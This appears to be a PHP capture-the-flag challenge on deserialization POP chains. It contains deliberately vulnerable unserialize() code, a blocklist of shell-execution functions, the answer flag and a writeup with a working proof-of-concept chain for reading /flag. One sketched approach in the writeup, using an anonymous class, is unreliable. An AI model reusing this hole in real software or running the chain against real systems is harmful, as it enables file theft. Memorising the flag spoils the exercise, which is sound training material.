<?php
/*
 * 题目6: 反序列化POP链
 * 考察点: 复杂POP链构造、多类组合利用、魔术方法调用链
 * 难度: 困难
 * Flag: flag{p0p_ch41n_m4st3r_2024}
 */

error_reporting(0);
highlight_file(__FILE__);

class FileReader {
    public $filename;
    public $content;
    
    public function __construct($filename = '') {
        $this->filename = $filename;
    }
    
    public function read() {
        if (file_exists($this->filename)) {
            $this->content = file_get_contents($this->filename);
            return $this->content;
        }
        return "File not found!";
    }
    
    public function __toString() {
        return $this->read();
    }
}

class Logger {
    public $handler;
    public $log_file;
    
    public function __construct() {
        $this->log_file = '/tmp/app.log';
    }
    
    public function __call($name, $arguments) {
        echo "Calling method: $name<br>";
        if (is_callable($this->handler)) {
            call_user_func($this->handler, $arguments[0]);
        }
    }
    
    public function write($data) {
        file_put_contents($this->log_file, $data, FILE_APPEND);
    }
}

class DataProcessor {
    public $data;
    public $processor;
    
    public function process() {
        if (is_object($this->processor)) {
            return $this->processor->transform($this->data);
        }
        return $this->data;
    }
    
    public function __destruct() {
        echo "Processing data...<br>";
        $result = $this->process();
        echo "Result: $result<br>";
    }
}

class Transformer {
    public $callback;
    public $param;
    
    public function transform($data) {
        if ($this->callback === 'system' || $this->callback === 'exec' || 
            $this->callback === 'shell_exec' || $this->callback === 'passthru' ||
            $this->callback === 'eval' || $this->callback === 'assert') {
            die("Dangerous function blocked!");
        }
        return call_user_func($this->callback, $data);
    }
}

class CacheManager {
    public $cache = [];
    public $serializer;
    
    public function __wakeup() {
        echo "Cache Manager initialized.<br>";
    }
    
    public function __get($name) {
        if (isset($this->cache[$name])) {
            return $this->cache[$name];
        }
        // 触发序列化器
        if ($this->serializer) {
            return $this->serializer->serialize($name);
        }
    }
}

class Serializer {
    public $format;
    public $encoder;
    
    public function serialize($data) {
        echo "Serializing in format: {$this->format}<br>";
        // 触发encoder的encode方法
        if (is_object($this->encoder)) {
            return $this->encoder->encode($data);
        }
        return serialize($data);
    }
}

// 入口点
if (isset($_GET['data'])) {
    $data = base64_decode($_GET['data']);
    if ($data === false) {
        die("Invalid base64 data!");
    }
    
    // 基本过滤
    if (preg_match('/system|exec|passthru|shell_exec|popen|proc_open|eval|assert/i', $data)) {
        die("Dangerous keywords detected!");
    }
    
    unserialize($data);
} else {
    echo "<br><br>Usage: ?data=base64_encoded_serialized_data<br>";
    echo "Hint: Build a POP chain to read /flag<br>";
    echo "Classes available: FileReader, Logger, DataProcessor, Transformer, CacheManager, Serializer<br>";
}
?>
<?php
/*
Writeup:
POP链构造思路：

目标：读取 /flag 文件内容

链路分析：
1. DataProcessor::__destruct() -> 调用 process()
2. process() 调用 $this->processor->transform($this->data)
3. 如果processor不是Transformer类，会触发 __call
4. Logger::__call() 可以调用 call_user_func

方案1：使用FileReader读取文件
链路：DataProcessor::__destruct() 
      -> DataProcessor::process() 
      -> 需要让结果输出（echo $result）
      -> FileReader::__toString() 
      -> FileReader::read()

构造：
$fileReader = new FileReader();
$fileReader->filename = '/flag';

$processor = new DataProcessor();
$processor->data = 'anything';
$processor->processor = new class { 
    public function transform($data) { 
        return new FileReader('/flag'); 
    }
};

更简单的方案：
由于 DataProcessor::__destruct() 会 echo $result
而 FileReader::__toString() 会读取文件

$fileReader = new FileReader();
$fileReader->filename = 'flag.php'; // 或 /flag

$dataProcessor = new DataProcessor();
$dataProcessor->data = $fileReader;
$dataProcessor->processor = new Transformer();

$transformer = new Transformer();
$transformer->callback = 'strval'; // 将对象转为字符串，触发__toString

完整POC：
<?php
class FileReader {
    public $filename = '/flag';
}

class DataProcessor {
    public $data;
    public $processor;
}

class Transformer {
    public $callback = 'strval';
}

$fr = new FileReader();
$t = new Transformer();
$dp = new DataProcessor();
$dp->data = $fr;
$dp->processor = $t;

echo base64_encode(serialize($dp));
*/
?>
